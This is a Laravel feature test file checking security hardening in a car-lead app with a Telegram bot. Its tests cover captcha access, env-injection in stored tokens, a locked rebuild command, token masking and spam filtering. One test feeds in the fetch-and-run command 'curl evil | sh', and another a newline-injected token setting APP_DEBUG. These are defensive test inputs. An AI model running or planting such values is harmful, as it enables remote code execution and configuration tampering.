<?php

namespace Tests\Feature;

use App\Models\Lead;
use App\Models\User;
use App\Services\Telegram\TelegramClient;
use App\Services\Telegram\TelegramException;
use App\Support\Settings;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Http\Client\ConnectionException;
use Illuminate\Support\Facades\Http;
use Tests\TestCase;

class SecurityHardeningTest extends TestCase
{
    use RefreshDatabase;

    public function test_captcha_page_requires_login_and_store_rejects_injection(): void
    {
        config(['che168.gate_secret' => 'gate-secret-123']);
        $this->get('/che168/captcha?force=captcha')->assertRedirect(route('che168.login'));

        // даже с секретом токен с переводом строки не пишется
        $this->postJson('/che168/gate/store?secret=gate-secret-123', ['token' => "abc\nAPP_DEBUG=true"])->assertStatus(422);
        $this->postJson('/che168/gate/store?secret=wrong', ['token' => 'abcdefgh123'])->assertForbidden();
    }

    public function test_rebuild_command_is_not_editable_from_admin(): void
    {
        $user = User::factory()->create();
        $this->actingAs($user)->put('/che168/settings', ['site_rebuild_command' => 'curl evil | sh'])->assertRedirect();
        $this->assertNotSame('curl evil | sh', Settings::get('site_rebuild_command'));
        $this->actingAs($user)->get('/che168/settings')->assertOk()->assertSee('SITE_REBUILD_COMMAND');
    }

    public function test_telegram_network_errors_do_not_leak_token(): void
    {
        Http::fake(fn () => throw new ConnectionException('cURL error 28 for https://api.telegram.org/bot123456:SECRETtokenPART_xyz/sendMessage'));
        try {
            (new TelegramClient('123456:SECRETtokenPART_xyz'))->sendMessage(1, 'x');
            $this->fail('должно бросить');
        } catch (TelegramException $e) {
            $this->assertStringNotContainsString('SECRETtokenPART', $e->getMessage());
            $this->assertStringContainsString('bot***', $e->getMessage());
        }
    }

    public function test_spam_chat_is_not_forwarded_and_status_is_hidden(): void
    {
        Settings::setMany(['tg_bot_token' => '123456:ABCDEFGHIJKLMNOPQRSTUVWXYZ_abc', 'tg_manager_chat_ids' => '-1001']);
        Http::fake(['api.telegram.org/*' => Http::response(['ok' => true, 'result' => ['message_id' => 5]])]);
        $token = $this->postJson('/api/v1/chat', ['message' => 'Привет, вопрос'])->assertCreated()->json('token');
        Lead::query()->update(['status' => 'spam']);
        $before = count(Http::recorded());
        $this->postJson("/api/v1/chat/{$token}", ['message' => 'купи рекламу'])->assertOk();
        $this->assertSame($before, count(Http::recorded()), 'спам не уходит менеджерам');
        $this->getJson("/api/v1/chat/{$token}")->assertOk()->assertJsonMissingPath('status');
    }

    public function test_failed_chat_message_is_resent_by_renotify(): void
    {
        Settings::setMany(['tg_bot_token' => '123456:ABCDEFGHIJKLMNOPQRSTUVWXYZ_abc', 'tg_manager_chat_ids' => '-1001']);
        $fail = false;
        Http::fake(['api.telegram.org/*' => function () use (&$fail) {
            return $fail ? Http::response(['ok' => false, 'error_code' => 502, 'description' => 'Bad Gateway'], 502) : Http::response(['ok' => true, 'result' => ['message_id' => 7]]);
        }]);
        $token = $this->postJson('/api/v1/chat', ['message' => 'Первый вопрос'])->json('token');
        $fail = true;
        $this->postJson("/api/v1/chat/{$token}", ['message' => 'Второй вопрос'])->assertOk();
        $msg = \App\Models\LeadMessage::query()->where('text', 'Второй вопрос')->sole();
        $this->assertNull($msg->forwarded_at);

        $fail = false;
        $this->travel(2)->minutes();
        $this->artisan('leads:renotify')->assertSuccessful();
        $this->assertNotNull($msg->fresh()->forwarded_at);
    }

    public function test_showcase_version_bumps_atomically(): void
    {
        $v = Settings::int('showcase_version', 1);
        Settings::bumpShowcaseVersion();
        Settings::bumpShowcaseVersion();
        $this->assertSame($v + 2, Settings::int('showcase_version'));
    }

    public function test_webhook_update_is_processed_once_and_showcase_exposes_rules(): void
    {
        Settings::setMany(['tg_webhook_secret' => 'sekret', 'tg_bot_token' => '123456:ABCDEFGHIJKLMNOPQRSTUVWXYZ_abc', 'utilization_max_hp' => '150']);
        Http::fake(['api.telegram.org/*' => Http::response(['ok' => true, 'result' => ['message_id' => 1]])]);
        $upd = ['update_id' => 777001, 'message' => ['message_id' => 1, 'text' => 'Хочу Камри', 'chat' => ['id' => 55, 'type' => 'private'], 'from' => ['id' => 55]]];
        $this->postJson('/api/telegram/webhook', $upd, ['X-Telegram-Bot-Api-Secret-Token' => 'sekret'])->assertOk();
        $this->postJson('/api/telegram/webhook', $upd, ['X-Telegram-Bot-Api-Secret-Token' => 'sekret'])->assertOk()->assertJsonPath('duplicate', true);
        $this->assertSame(1, Lead::query()->count());

        $this->getJson('/api/v1/showcase')->assertOk()->assertJsonPath('meta.utilization.max_hp', 150);
    }
}
